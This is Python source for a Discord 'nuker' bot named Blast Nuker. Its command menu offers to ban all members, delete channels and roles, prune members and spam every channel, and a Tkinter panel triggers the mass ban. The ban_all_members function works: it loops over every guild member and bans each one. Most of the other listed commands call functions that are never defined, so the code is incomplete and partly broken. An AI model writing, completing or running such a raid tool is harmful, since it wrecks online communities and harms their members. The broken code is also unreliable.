import discord
from discord.ext import commands
import tkinter as tk
from tkinter import messagebox
import threading

# Function to securely load the token and prefix
def get_token_and_prefix():
    token = input("Enter your bot token: ")
    prefix = input("Enter your bot prefix: ")  # Ensure you are getting the prefix
    return token, prefix  # Return both token and prefix

# Display banner function
def display_banner():
    banner_text = """
  ____  _           _     _   _       _             
 |  _ \| |         | |   | \ | |     | |            
 | |_) | | __ _ ___| |_  |  \| |_   _| | _____ _ __ 
 |  _ <| |/ _` / __| __| | . ` | | | | |/ / _ \ '__|
 | |_) | | (_| \__ \ |_  | |\  | |_| |   <  __/ |   
 |____/|_|\__,_|___/\__| |_| \_|\__,_|_|\_\___|_|   
                                                    
                                                    
"""
    print(banner_text)

# Bot setup
def main():
    # Securely load token and prefix
    token, prefix = get_token_and_prefix()

    # Set up intents
    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True

    # Initialize bot
    bot = commands.Bot(command_prefix=prefix, intents=intents)
    bot.remove_command("help")

    # Event for when the bot is ready
    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        print(f'Bot ID: {bot.user.id}')
        print('--- Ready for servers ---\n')
        display_banner()

        # Display the list of commands
        await display_command_list()

    # Display command list in the channel
    async def display_command_list():
        command_list = """
        Here are the available commands:
        [1] - Ban all members
        [2] - Delete Channels
        [3] - Delete Roles
        [4] - Kick Members
        [5] - Prune Members
        [6] - Create Channels
        [7] - Spam All Channels
        [8] - Create Roles
        [9] - Delete Roles
        [10] - Rename Channels
        [11] - Rename Guild
        [12] - Rename Roles
        [13] - Credits
        [14] - Exit
        """
        
        # Create embed with red color
        embed = discord.Embed(title="Command List", description=command_list, color=discord.Color.red())
        
        # Send the embed to the desired channel
        channel = bot.get_channel(123456789012345678)  # Replace with your actual channel ID
        await channel.send(embed=embed)

        # Ask user for input (simulating a command interface)
        await ask_for_command()

    # Function to handle command input from the user
    async def ask_for_command():
        channel = bot.get_channel(123456789012345678)  # Replace with your actual channel ID
        await channel.send("Please enter the number of the command you want to execute:")

        # Wait for user input in the channel
        def check(msg):
            return msg.author == channel.guild.me and msg.content.isdigit()

        message = await bot.wait_for('message', check=check)
        command_number = int(message.content)

        # Call corresponding function based on the user's input
        await execute_command(command_number)

    # Function to execute the selected command
    async def execute_command(command_number):
        if command_number == 1:
            await ban_all_members()
        elif command_number == 2:
            await delete_channels()
        elif command_number == 3:
            await delete_roles()
        elif command_number == 4:
            await kick_members()
        elif command_number == 5:
            await prune_members()
        elif command_number == 6:
            await create_channels()
        elif command_number == 7:
            await spam_channels()
        elif command_number == 8:
            await create_roles()
        elif command_number == 9:
            await delete_roles()
        elif command_number == 10:
            await rename_channels()
        elif command_number == 11:
            await rename_guild()
        elif command_number == 12:
            await rename_roles()
        elif command_number == 13:
            await credits()
        elif command_number == 14:
            await bot.logout()  # Exit the bot
        else:
            print("Invalid selection")

    # Function implementations for commands (you already have some of them)
    async def ban_all_members():
        guild = bot.get_guild(123456789012345678)  # Replace with your guild ID
        members = guild.members
        for member in members:
            try:
                await member.ban(reason="Banned by control panel")
                print(f"Banned {member.name}")
            except discord.Forbidden:
                print(f"Could not ban {member.name} (no permission)")
        messagebox.showinfo("Action Executed", "Banned all members!")

    async def create_channels():
        guild = bot.get_guild(123456789012345678)  # Replace with your guild ID
        await guild.create_text_channel("new-channel")
        print("Created channel 'new-channel'")
        messagebox.showinfo("Action Executed", "Created a new channel!")

    # Tkinter GUI for controlling the bot
    def start_gui():
        # Create the main window
        window = tk.Tk()
        window.title("Bot Control Panel")
        window.geometry("300x300")

        # Create buttons for each command
        ban_button = tk.Button(window, text="Ban All Members", command=lambda: bot.loop.create_task(ban_all_members()))
        ban_button.pack(pady=5)

        create_channel_button = tk.Button(window, text="Create Channel", command=lambda: bot.loop.create_task(create_channels()))
        create_channel_button.pack(pady=5)

        # Exit button
        exit_button = tk.Button(window, text="Exit", command=window.quit)
        exit_button.pack(pady=10)

        # Start the GUI main loop
        window.mainloop()

    # Start Tkinter GUI in a new thread to allow bot to run simultaneously
    gui_thread = threading.Thread(target=start_gui)
    gui_thread.start()

    # Run the bot
    bot.run(token)

if __name__ == "__main__":
    main()